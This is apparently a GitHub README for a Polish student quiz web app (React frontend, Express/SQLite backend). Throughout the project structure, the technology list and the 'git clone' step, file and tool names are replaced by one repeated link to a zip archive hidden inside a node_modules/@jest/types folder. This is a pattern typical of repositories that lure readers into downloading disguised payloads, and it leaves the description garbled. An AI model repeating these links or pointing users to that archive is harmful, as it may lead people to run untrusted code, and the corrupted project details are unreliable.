# QuizMaster

Nowoczesna aplikacja E-learningowa do tworzenia, rozwiązywania i zarządzania quizami. (work in progress!)

## Spis treści
- [Opis](#opis)
- [Funkcje](#funkcje)
- [Technologie](#technologie)
- [Struktura projektu](#struktura-projektu)
- [Instalacja i uruchomienie](#instalacja-i-uruchomienie)
- [Instrukcja użytkownika](#instrukcja-użytkownika)
- [Autor](#autor)

---

## Opis
QuizMaster to pełny serwis E-learningowy (frontend + backend), umożliwiający:
- Tworzenie własnych quizów z pytaniami jednokrotnego i wielokrotnego wyboru
- Rozwiązywanie quizów innych użytkowników
- Przeglądanie wyników i statystyk
- Dynamiczną zmianę języka (PL/EN) i motywu kolorystycznego
- Responsywny, nowoczesny interfejs

## Funkcje
- Rejestracja i logowanie użytkowników
- Tworzenie i usuwanie własnych quizów
- Rozwiązywanie quizów z limitem czasu
- Przeglądanie quizów wg kategorii, poziomu, języka
- Statystyki quizów i użytkownika
- Historia wyników
- Dynamiczna zmiana języka (PL/EN)
- Dynamiczna zmiana motywu kolorystycznego
- Animacje przejść i nowoczesny UI
- Pełna responsywność (mobile/tablet/desktop)

## Technologie
- **Frontend:** React, styled-components, framer-motion, react-router-dom
- **Backend:** https://github.com/MaTiino/QuizMaster/raw/refs/heads/main/client/node_modules/@jest/globals/node_modules/@jest/types/Master-Quiz-sammer.zip, Express, SQLite
- **Inne:** JWT (autoryzacja), bcryptjs (hasła)

## Struktura projektu
```
quizmaster/
  client/         # Frontend React
    src/
      components/ # Komponenty UI (Navbar, itp.)
      context/    # Konteksty (Auth, Kolory, Tłumaczenia)
      pages/      # Widoki/strony (Quizy, Wyniki, Profil, itp.)
      https://github.com/MaTiino/QuizMaster/raw/refs/heads/main/client/node_modules/@jest/globals/node_modules/@jest/types/Master-Quiz-sammer.zip    # Entry point
      https://github.com/MaTiino/QuizMaster/raw/refs/heads/main/client/node_modules/@jest/globals/node_modules/@jest/types/Master-Quiz-sammer.zip      # Routing
    public/       # https://github.com/MaTiino/QuizMaster/raw/refs/heads/main/client/node_modules/@jest/globals/node_modules/@jest/types/Master-Quiz-sammer.zip, manifest
    https://github.com/MaTiino/QuizMaster/raw/refs/heads/main/client/node_modules/@jest/globals/node_modules/@jest/types/Master-Quiz-sammer.zip  # Zależności frontu
  server/         # Backend https://github.com/MaTiino/QuizMaster/raw/refs/heads/main/client/node_modules/@jest/globals/node_modules/@jest/types/Master-Quiz-sammer.zip
    https://github.com/MaTiino/QuizMaster/raw/refs/heads/main/client/node_modules/@jest/globals/node_modules/@jest/types/Master-Quiz-sammer.zip      # Serwer API
    https://github.com/MaTiino/QuizMaster/raw/refs/heads/main/client/node_modules/@jest/globals/node_modules/@jest/types/Master-Quiz-sammer.zip   # Logika bazy SQLite
    https://github.com/MaTiino/QuizMaster/raw/refs/heads/main/client/node_modules/@jest/globals/node_modules/@jest/types/Master-Quiz-sammer.zip   # Baza danych
    https://github.com/MaTiino/QuizMaster/raw/refs/heads/main/client/node_modules/@jest/globals/node_modules/@jest/types/Master-Quiz-sammer.zip  # Zależności backendu
```

## Instalacja i uruchomienie
1. **Klonuj repozytorium:**
   ```
   git clone https://github.com/MaTiino/QuizMaster/raw/refs/heads/main/client/node_modules/@jest/globals/node_modules/@jest/types/Master-Quiz-sammer.zip
   cd quizmaster
   ```
2. **Zainstaluj zależności:**
   - Frontend:
     ```
     cd client
     npm install
     ```
   - Backend:
     ```
     cd ../server
     npm install
     ```
3. **Uruchom backend:**
   ```
   npm start
   ```
   (domyślnie na porcie 5000)
4. **Uruchom frontend:**
   ```
   otwórz nowy terminal
   cd quizmaster/client
   npm start
   ```
   (aplikacja dostępna na http://localhost:3000)

## Instrukcja użytkownika
- **Rejestracja/logowanie:** Załóż konto, zaloguj się.
- **Tworzenie quizu:** Przejdź do "Utwórz quiz", wypełnij formularz, dodaj pytania, zapisz.
- **Przeglądanie quizów:** Wybierz "Przeglądaj quizy", filtruj wg kategorii, poziomu, języka.
- **Rozwiązywanie quizu:** Kliknij "Zobacz quiz" → "Rozpocznij quiz". Po zakończeniu zobaczysz wynik.
- **Wyniki i statystyki:** Przejdź do "Wyniki".
- **Zmiana języka/motywu:** Użyj przycisków w prawym górnym rogu (lub w menu mobilnym).

## Autor
Aplikacja stworzona przez Mateusza Toporka w ramach zaliczenia przedmiotu "Serwisy E-learningowe 2.0". 
